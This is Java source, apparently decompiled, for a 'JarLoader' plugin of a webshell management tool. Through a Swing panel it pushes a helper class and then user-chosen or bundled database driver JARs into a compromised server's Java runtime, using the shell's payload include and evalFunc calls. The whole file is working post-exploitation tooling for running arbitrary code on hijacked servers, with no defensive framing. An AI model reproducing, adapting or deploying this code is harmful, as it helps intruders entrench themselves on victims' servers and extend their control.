package shells.plugins.java;

import core.Encoding;
import core.annotation.PluginAnnotation;
import core.imp.Payload;
import core.imp.Plugin;
import core.shell.ShellEntity;
import core.ui.component.GBC;
import core.ui.component.dialog.GFileChooser;
import core.ui.component.dialog.GOptionPane;
import java.awt.BorderLayout;
import java.awt.GridBagLayout;
import java.awt.event.ActionEvent;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStream;
import javax.swing.JButton;
import javax.swing.JComboBox;
import javax.swing.JLabel;
import javax.swing.JPanel;
import javax.swing.JSplitPane;
import javax.swing.JTextField;
import javax.swing.filechooser.FileNameExtensionFilter;
import util.Log;
import util.UiFunction;
import util.automaticBindClick;
import util.functions;
import util.http.ReqParameter;

@PluginAnnotation(
   payloadName = "JavaDynamicPayload",
   Name = "JarLoader",
   DisplayName = "JarLoader"
)
public class JarLoader implements Plugin {
   private static final String CLASS_NAME = "plugin.JarLoader";
   private static final String[] DB_JARS = new String[]{"mysql", "ojdbc5", "sqljdbc41"};
   private final JPanel panel = new JPanel(new BorderLayout());
   private final JComboBox<String> jarComboBox;
   private final JButton loadJarButton = new JButton("LoadJar");
   private final JButton selectJarButton = new JButton("select Jar");
   private final JButton loadDbJarButton = new JButton("LoadDbJar");
   private final JLabel jarFileLabel = new JLabel("JarFile: ");
   private final JTextField jarTextField = new JTextField(30);
   private final JSplitPane meterpreterSplitPane;
   private boolean loadState;
   private ShellEntity shellEntity;
   private Payload payload;
   private Encoding encoding;

   public JarLoader() {
      this.jarComboBox = new JComboBox(DB_JARS);
      this.meterpreterSplitPane = new JSplitPane();
      this.meterpreterSplitPane.setOrientation(0);
      this.meterpreterSplitPane.setDividerSize(0);
      JPanel TopPanel = new JPanel();
      TopPanel.add(this.jarFileLabel);
      TopPanel.add(this.jarTextField);
      TopPanel.add(this.selectJarButton);
      TopPanel.add(this.loadJarButton);
      JPanel bottomPanel = new JPanel(new GridBagLayout());
      GBC gbcJarCommbox = (new GBC(0, 0)).setInsets(5, -40, 0, 0);
      GBC gbcLoadDb = (new GBC(0, 1)).setInsets(5, -40, 0, 0);
      bottomPanel.add(this.jarComboBox, gbcJarCommbox);
      bottomPanel.add(this.loadDbJarButton, gbcLoadDb);
      this.meterpreterSplitPane.setTopComponent(TopPanel);
      this.meterpreterSplitPane.setBottomComponent(bottomPanel);
      this.panel.add(this.meterpreterSplitPane);
   }

   private void selectJarButtonClick(ActionEvent actionEvent) {
      GFileChooser chooser = new GFileChooser();
      chooser.setFileFilter(new FileNameExtensionFilter("*.jar", new String[]{"jar"}));
      chooser.setFileSelectionMode(0);
      boolean flag = 0 == chooser.showDialog(UiFunction.getParentFrame(this.panel), "选择");
      File selectdFile = chooser.getSelectedFile();
      if (flag && selectdFile != null) {
         this.jarTextField.setText(selectdFile.getAbsolutePath());
      } else {
         Log.log("用户取消选择.....");
      }

   }

   private void loadJarButtonClick(ActionEvent actionEvent) {
      try {
         File jarFile = new File(this.jarTextField.getText());
         InputStream inputStream = new FileInputStream(jarFile);
         byte[] jarByteArray = functions.readInputStream(inputStream);
         inputStream.close();
         GOptionPane.showMessageDialog(this.panel, this.loadJar(jarByteArray), "提示", 1);
      } catch (Exception var5) {
         Log.error((Throwable)var5);
         GOptionPane.showMessageDialog(this.panel, var5.getMessage(), "提示", 2);
      }

   }

   private void loadDbJarButtonClick(ActionEvent actionEvent) {
      try {
         InputStream inputStream = this.getClass().getResourceAsStream(String.format("assets/%s.jar", this.jarComboBox.getSelectedItem()));
         byte[] jarByteArray = functions.readInputStream(inputStream);
         inputStream.close();
         GOptionPane.showMessageDialog(this.panel, this.loadJar(jarByteArray), "提示", 1);
      } catch (Exception var4) {
         Log.error((Throwable)var4);
         GOptionPane.showMessageDialog(this.panel, var4.getMessage(), "提示", 2);
      }

   }

   private void load() {
      if (!this.loadState) {
         try {
            InputStream inputStream = this.getClass().getResourceAsStream("assets/JarLoader.classs");
            byte[] data = functions.readInputStream(inputStream);
            inputStream.close();
            if (this.payload.include("plugin.JarLoader", data)) {
               this.loadState = true;
               Log.log("Load success");
            } else {
               Log.log("Load fail");
            }
         } catch (Exception var3) {
            Log.error((Throwable)var3);
         }
      }

   }

   public boolean loadJar(byte[] jarByteArray) {
      try {
         this.load();
         ReqParameter parameter = new ReqParameter();
         parameter.add("jarByteArray", jarByteArray);
         String resultString = this.encoding.Decoding(this.payload.evalFunc("plugin.JarLoader", "loadJar", parameter));
         Log.log("loadJar:%s", resultString);
         if ("ok".equals(resultString)) {
            return true;
         }
      } catch (Exception var4) {
         Log.error((Throwable)var4);
      }

      return false;
   }

   public boolean hasClass(String className) {
      this.load();
      ReqParameter parameter = new ReqParameter();
      parameter.add("className", className);

      try {
         String resultString = this.encoding.Decoding(this.payload.evalFunc("plugin.JarLoader", "hasClass", parameter));
         return Boolean.parseBoolean(resultString);
      } catch (Exception var4) {
         Log.error((Throwable)var4);
         return false;
      }
   }

   public void init(ShellEntity shellEntity) {
      this.shellEntity = shellEntity;
      this.payload = this.shellEntity.getPayloadModule();
      this.encoding = Encoding.getEncoding(this.shellEntity);
      automaticBindClick.bindJButtonClick(this, this);
   }

   public JPanel getView() {
      return this.panel;
   }
}
